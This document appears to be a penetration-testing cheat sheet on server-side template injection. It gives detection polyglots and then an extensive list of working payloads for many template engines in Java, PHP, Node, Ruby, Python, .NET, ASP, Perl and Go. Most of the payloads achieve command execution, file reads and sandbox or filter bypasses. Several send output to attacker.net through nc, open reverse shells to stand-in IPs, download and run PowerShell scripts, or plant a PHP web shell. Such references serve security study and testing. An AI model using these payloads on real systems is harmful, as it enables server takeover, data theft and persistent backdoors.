<!-- omit in toc -->
# SSTI (Server-Side Template Injection)

<!-- omit in toc -->
## Table of Contents

1. [Fundamentals](#fundamentals)
	1. [Template Engines](#template-engines)
	2. [SSTI (Server-Side Template Injection)](#ssti-server-side-template-injection)
2. [Detect](#detect)
	1. [Plaintext context](#plaintext-context)
	2. [Code context](#code-context)
3. [Identify template engine](#identify-template-engine)
4. [Exploit](#exploit)
	1. [Template Engine Documentation](#template-engine-documentation)
	2. [Explore restricted environments](#explore-restricted-environments)
5. [Payloads](#payloads)
	1. [Generic](#generic)
	2. [Java](#java)
		1. [Basic Injection](#basic-injection)
		2. [Retrieve the system's environment variables](#retrieve-the-systems-environment-variables)
		3. [Retrieve /etc/passwd](#retrieve-etcpasswd)
		4. [Custom commands](#custom-commands)
		5. [EL (Expression Language)](#el-expression-language)
		6. [FreeMarker](#freemarker)
			1. [FreeMarker - Sandbox Bypass (<2.3.30)](#freemarker---sandbox-bypass-2330)
		7. [Groovy](#groovy)
			1. [Groovy - Sandbox Bypass](#groovy---sandbox-bypass)
		8. [Hubspot - HuBL](#hubspot---hubl)
		9. [Jinjava](#jinjava)
		10. [Pebble](#pebble)
		11. [Spring View Manipulation](#spring-view-manipulation)
		12. [Thymeleaf](#thymeleaf)
		13. [Velocity](#velocity)
	3. [PHP](#php)
		1. [Smarty](#smarty)
		2. [Twig](#twig)
	4. [NodeJS](#nodejs)
		1. [Handlebars](#handlebars)
		2. [Jade/Codepen](#jadecodepen)
		3. [JsRender](#jsrender)
		4. [LessJS](#lessjs)
		5. [Nunjucks](#nunjucks)
		6. [PugJs](#pugjs)
	5. [Ruby](#ruby)
		1. [ERB](#erb)
		2. [Slim](#slim)
	6. [Python](#python)
		1. [Jinja2](#jinja2)
		2. [Tornado](#tornado)
		3. [Mako](#mako)
	7. [.Net](#net)
		1. [Razor](#razor)
	8. [ASP](#asp)
	9. [Perl](#perl)
		1. [Mojolicious](#mojolicious)
	10. [Go](#go)

## Fundamentals

### Template Engines

Template engines are used when you want to rapidly build web applications that are split into different components. Templates also enable fast rendering of the server-side data that needs to be passed to the application.

Template engines are designed to generate web pages by combining fixed templates with volatile data.

### SSTI (Server-Side Template Injection)

A server-side template injection occurs when an attacker is able to use native template engine syntax to inject a malicious payload into a template, which is then executed server-side.

Server-side template injections occur when user input is concatenated directly into a template. This allows attackers to inject arbitrary template directives in order to manipulate the template engines, often enabling then to take complete control of the server.

## Detect

As said, SSTI occurs when user input is not sanitized and is directly passed to the template engine. To detect if we are in front of a SSTI vulnerability, we have to inject a special sequence of characters in suspicious to be vulnerable parameters. In order to do this we can use the following polyglot:

```text
${{<%[%'"}}%\.
```

Once we inject the polyglot in the suspicious to be vulnerable parameter, we will spot the differences between the response with regular data and the response with the given polyglot used as data. This can lead to different behaviors:

- Error from the template engine is thrown in the response (Thus, making it easy to identify that the server is vulnerable and sometimes the running template engine too).
- Chars of the polyglot missing in the response.
- Polyglot not being reflected in a place where you were expecting it to be reflected.

### Plaintext context

The given input is being rendered and reflected into the response. We can differentiate it from a typical XSS doing mathematical expressions as:

```text
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```

### Code context

The given input is being placed within a template expression. Similar to SQLi, we have to "close" the expression to make it valid. We will use payloads as follow:

```text
7*7}}
7*7}
7*7 %>
```

## Identify template engine

Once we have identified that the server is vulnerable to SSTI, we have to identify the template engine that is running. If in the detection phase we can see errors printed, the identification of the template engine will be easier. We can cause errors with the following payloads:

```text
${}
{{}}
<%= %>
${7/0}
{{7/0}}
<%= 7/0 %>
${foobar}
{{foobar}}
<%= foobar %>
${7*7}
{{7*7}}
```

We can use the following schema to identify the template engine too:

![SSTI Engine Detection](../Images/Web/Template%20Injection/SSTI%20Engine%20Detection.png)

## Exploit

### Template Engine Documentation

If we identify the template engine, the first thing to do is to read the documentation of it. This will help us understand how it works and its basic syntax.

It is important to look on how to embed native code blocks in the template as it can lead to a quick exploit. We have to look for security sections in the documentation too, in this section they are usually highlighted things to avoid doing with the template and we can use them to construct an exploit.

### Explore restricted environments

In some cases we will have a restricted number of objects or functions that we can use. In this cases we will need to list variables, functions, objects, etc. The listing will depend on the language used by the template engine.

You can expect to find both default objects provided by the template engine, and application-specific objects passed in to the template by the developer. Many template systems expose a "self" or namespace object containing everything in scope, and a idiomatic way to list an object's attributes and methods.

If there is no builtin self object you are going to have to bruteforce variable names using [SecLists](https://github.com/danielmiessler/SecLists) and Burp Intruder.

## Payloads

### Generic

[Generic detection wordlist](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt)

[Generic exploitation wordlist](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Intruder/ssti.fuzz)

### Java

#### Basic Injection

```java
${7*7}

${{7*7}}

${class.getClassLoader()}

${class.getResource("").getPath()}

${class.getResource("../../../../../index.htm").getContent()}
```

All of the above payloads can be used with the following variable expressions:

- ${...}
- #{...}
- *{...}
- @{...}
- ~{...}

#### Retrieve the system's environment variables

```java
${T(java.lang.System).getenv()}
```

#### Retrieve /etc/passwd

```java
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

#### Custom commands

[SSTI Payload Generator](https://github.com/VikasVarshney/ssti-payload)

#### EL (Expression Language)

JVM System Property Lookup

```java
${"".getClass().forName("java.lang.System").getDeclaredMethod("getProperty","".getClass()).invoke("","java.class.path")}
```

DNS Lookup

```java
${"".getClass().forName("java.net.InetAddress").getMethod("getByName","".getClass()).invoke("","attacker.net")}
```

Command execution

```java
''.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id')

''.class.forName('java.lang.ProcessBuilder').getDeclaredConstructors()[1].newInstance('id').start()

${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("id")}

${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"uname -a\\\")"))}

${facesContext.getExternalContext().setResponseHeader("output","".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval(\"var x=new java.lang.ProcessBuilder;x.command(\\\"uname\\\",\\\"-a\\\");org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"))}
```

```java
#{session.setAttribute("rtc","".getClass().forName("java.lang.Runtime").getDeclaredConstructors()[0])}

#{session.getAttribute("rtc").setAccessible(true)}

#{session.getAttribute("rtc").getRuntime().exec("/bin/bash -c id")}
```

```java
${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}

${request.getAttribute("c").add("cmd.exe")}

${request.getAttribute("c").add("/k")}

${request.getAttribute("c").add("whoami /priv")}

${request.setAttribute("a","".getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance(request.getAttribute("c")).start())}

${request.getAttribute("a")}
```

#### FreeMarker

Read file

```java
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
```

Command execution

```java
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}

[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}

${"freemarker.template.utility.Execute"?new()("id")}
```

##### FreeMarker - Sandbox Bypass (<2.3.30)

```java
<#assign classloader=article.class.protectionDomain.classLoader>

<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>

<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>

<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>

${dwf.newInstance(ec,null)("id")}
```

#### Groovy

Read file

```java
${String x = new File('/etc/passwd').getText('UTF-8')}
```

Create file

```java
${String x = new File('C:/Temp/pwned.txt').text}

${new File("C:\Temp\pwned.txt").createNewFile();}
```

HTTP Request

```java
${"http://www.google.com".toURL().text}

${new URL("http://www.google.com").getText()}
```

Command execution

```java
${"calc.exe".exec()}

${"calc.exe".execute()}

${this.evaluate("9*9") //(this is a Script class)}

${new org.codehaus.groovy.runtime.MethodClosure("calc.exe","execute").call()}
```

##### Groovy - Sandbox Bypass

```java
${ @ASTTest(value={assert java.lang.Runtime.getRuntime().exec("id")})
def x }

${ new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x") }
```

#### Hubspot - HuBL

Command execution

```java
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"id\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"id\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```

#### Jinjava

Detect

```java
{{'a'.toUpperCase()}} would result in 'A'

{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
```

Command Execution

```java
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('id')\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"id\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"id\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```

#### Pebble

Command execution

(< 3.0.9)

```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id') }}
```

(> 3.0.9)

```java
{% raw %}
{% set cmd = 'id' %}
{% endraw %}

{% set bytes = (1).TYPE
     .forName('java.lang.Runtime')
     .methods[6]
     .invoke(null,null)
     .exec(cmd)
     .inputStream
     .readAllBytes() %}
{{ (1).TYPE
     .forName('java.lang.String')
     .constructors[0]
     .newInstance(([bytes]).toArray()) }}
```

#### Spring View Manipulation

Command execution

```java
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x

__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x
```

#### Thymeleaf

Command execution

```java
${T(java.lang.Runtime).getRuntime().exec('id')}

${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("id")}

[[${7*7}]]
```

#### Velocity

Command execution

```java
#set($str=$class.inspect("java.lang.String").type)

#set($chr=$class.inspect("java.lang.Character").type)

#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))

$ex.waitFor()

#set($out=$ex.getInputStream())

#foreach($i in [1..$out.available()])

$str.valueOf($chr.toChars($out.read()))

#end
```

### PHP

#### Smarty

Command execution

```php
{$smarty.version}

{php}echo `id`;{/php} // (< v3)

{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}

{system('id')} // (> v3)
```

#### Twig

Get information

```php
{{_self}} #(Ref. to current application)

{{_self.env}}

{{dump(app)}}

{{app.request.server.all|join(',')}}
```

File read

```php
"{{'/etc/passwd'|file_excerpt(1,30)}}"@

{{include("wp-config.php")}}
```

Command execution

```php
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}

{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}

{{['id']|filter('system')}}

{{['cat\x20/etc/passwd']|filter('system')}}

{{['cat$IFS/etc/passwd']|filter('system')}}
```

### NodeJS

#### Handlebars

Command execution

```js
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

#### Jade/Codepen

Command execution

```js
var x = root.process

x = x.mainModule.require

x = x('child_process')

x.exec('id | nc attacker.net 80')
```

```js
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```

#### JsRender

Command execution

```js
{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('id').toString()")()}}
```

#### LessJS

SSRF (Server-side Request Forgery)

```js
@import (inline) "http://localhost";
```

Read file

```js
@import (inline) "/etc/passwd";
```

Command execution

< v3

```js
body {
  color: `global.process.mainModule.require("child_process").execSync("id")`;
}
```

Plugins

(< v2)

```js
functions.add('cmd', function(val) {
  return `"${global.process.mainModule.require('child_process').execSync(val.value)}"`;
});
```

(> v3)

```js
//Vulnerable plugin (3.13.1)
registerPlugin({
    install: function(less, pluginManager, functions) {
        functions.add('cmd', function(val) {
            return global.process.mainModule.require('child_process').execSync(val.value).toString();
        });
    }
})
```

#### Nunjucks

Command execution

```js
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
```

#### PugJs

Command execution

```js
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('id')}()}
```



### Ruby

#### ERB

List files and directories

```ruby
<%= Dir.entries('/') %>
```

Read file

```ruby
<%= File.open('/etc/passwd').read %>
```

Command execution

```ruby
<%= system("id") %>

<%= `id` %>

<%= IO.popen('id').readlines()  %>

<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('id') %><%= @b.readline()%>

<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('id') %><%= @c.readline()%>
```

#### Slim

Command execution

```ruby
{ %x|id| }
```

### Python

#### Jinja2

Debug statement

```python
<pre>{% debug %}</pre>
```

Dump all used classes

```python
{{ [].class.base.subclasses() }}

{{''.class.mro()[1].subclasses()}}

{{ ''.__class__.__mro__[2].__subclasses__() }}
```

Dump all configuration variables

```python
{% for key, value in config.iteritems() %}
    <dt>{{ key|e }}</dt>
    <dd>{{ value|e }}</dd>
{% endfor %}
```

Read remote file

```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}

{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}

{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

Write into remote file

```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/pwned', 'w').write('You have been pwned !') }}
```

Command execution

```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}

{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}

{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}

{{ cycler.__init__.__globals__.os.popen('id').read() }}

{{ joiner.__init__.__globals__.os.popen('id').read() }}

{{ namespace.__init__.__globals__.os.popen('id').read() }}

{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}} // 396 may vary

{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.net\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"/etc/passwd\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```

Command execution via HTTP GET parameter:

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}&input=id
```

Evil config file

```python
# Evil Configuration
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}

# Load the Evil Configuration
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  

# Command execution
{{ config['RUNCMD']('id | nc attacker.net 80"',shell=True) }}
```

Filter bypass

```python
request.__class__

request["__class__"]

# Bypassing _
http://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_

{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}

{{request|attr(["_"*2,"class","_"*2]|join)}}

{{request|attr(["__","class","__"]|join)}}

{{request|attr("__class__")}}

{{request.__class__}}

# Bypassing [ and ]
http://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_

http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_

# Bypassing |join
http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_

# Bypassing common filters
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

#### Tornado

Command execution

```python
{% import os %}

{{os.system('id')}}
```

#### Mako

Command execution

```python
<%
import os

x=os.popen('id').read()

%>

${x}
```

Command execution via TemplateNamespaces

```python
${self.module.cache.util.os.system("id")}

${self.module.runtime.util.os.system("id")}

${self.template.module.cache.util.os.system("id")}

${self.module.cache.compat.inspect.os.system("id")}

${self.__init__.__globals__['util'].os.system('id')}

${self.template.module.runtime.util.os.system("id")}

${self.module.filters.compat.inspect.os.system("id")}

${self.module.runtime.compat.inspect.os.system("id")}

${self.module.runtime.exceptions.util.os.system("id")}

${self.template.__init__.__globals__['os'].system('id')}

${self.module.cache.util.compat.inspect.os.system("id")}

${self.module.runtime.util.compat.inspect.os.system("id")}

${self.template._mmarker.module.cache.util.os.system("id")}

${self.template.module.cache.compat.inspect.os.system("id")}

${self.module.cache.compat.inspect.linecache.os.system("id")}

${self.template._mmarker.module.runtime.util.os.system("id")}

${self.attr._NSAttr__parent.module.cache.util.os.system("id")}

${self.template.module.filters.compat.inspect.os.system("id")}

${self.template.module.runtime.compat.inspect.os.system("id")}

${self.module.filters.compat.inspect.linecache.os.system("id")}

${self.module.runtime.compat.inspect.linecache.os.system("id")}

${self.template.module.runtime.exceptions.util.os.system("id")}

${self.attr._NSAttr__parent.module.runtime.util.os.system("id")}

${self.context._with_template.module.cache.util.os.system("id")}

${self.module.runtime.exceptions.compat.inspect.os.system("id")}

${self.template.module.cache.util.compat.inspect.os.system("id")}

${self.context._with_template.module.runtime.util.os.system("id")}

${self.module.cache.util.compat.inspect.linecache.os.system("id")}

${self.template.module.runtime.util.compat.inspect.os.system("id")}

${self.module.runtime.util.compat.inspect.linecache.os.system("id")}

${self.module.runtime.exceptions.traceback.linecache.os.system("id")}

${self.module.runtime.exceptions.util.compat.inspect.os.system("id")}

${self.template._mmarker.module.cache.compat.inspect.os.system("id")}

${self.template.module.cache.compat.inspect.linecache.os.system("id")}

${self.attr._NSAttr__parent.template.module.cache.util.os.system("id")}

${self.template._mmarker.module.filters.compat.inspect.os.system("id")}

${self.template._mmarker.module.runtime.compat.inspect.os.system("id")}

${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system("id")}

${self.template._mmarker.module.runtime.exceptions.util.os.system("id")}

${self.template.module.filters.compat.inspect.linecache.os.system("id")}

${self.template.module.runtime.compat.inspect.linecache.os.system("id")}

${self.attr._NSAttr__parent.template.module.runtime.util.os.system("id")}

${self.context._with_template._mmarker.module.cache.util.os.system("id")}

${self.template.module.runtime.exceptions.compat.inspect.os.system("id")}

${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system("id")}

${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system("id")}

${self.context._with_template.module.cache.compat.inspect.os.system("id")}

${self.module.runtime.exceptions.compat.inspect.linecache.os.system("id")}

${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system("id")}

${self.context._with_template._mmarker.module.runtime.util.os.system("id")}

${self.context._with_template.module.filters.compat.inspect.os.system("id")}

${self.context._with_template.module.runtime.compat.inspect.os.system("id")}

${self.context._with_template.module.runtime.exceptions.util.os.system("id")}

${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}
```

### .Net

#### Razor

Command execution

```net
@{
	// C# Code
}

@System.Diagnostics.Process.Start("cmd.exe","/c whoami /priv");

@System.Diagnostics.Process.Start("cmd.exe","/c powershell.exe -enc IABpAHcAcgAgAC0AdQByAGkAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyAC4AMQAxADEALwB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAYQBzAGsAcwBcAHQAZQBzAHQAbQBlAHQANgA0AC4AZQB4AGUAOwAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGEAcwBrAHMAXAB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlAA==");
```

### ASP

Command execution

```asp
<%= CreateObject("Wscript.Shell").exec("powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/shell.ps1')").StdOut.ReadAll() %>
```

### Perl

#### Mojolicious

Command execution

```perl
<%= use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};%>

<% use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};%>
```

### Go

Command execution

```go
{{ .System "id" }}
```
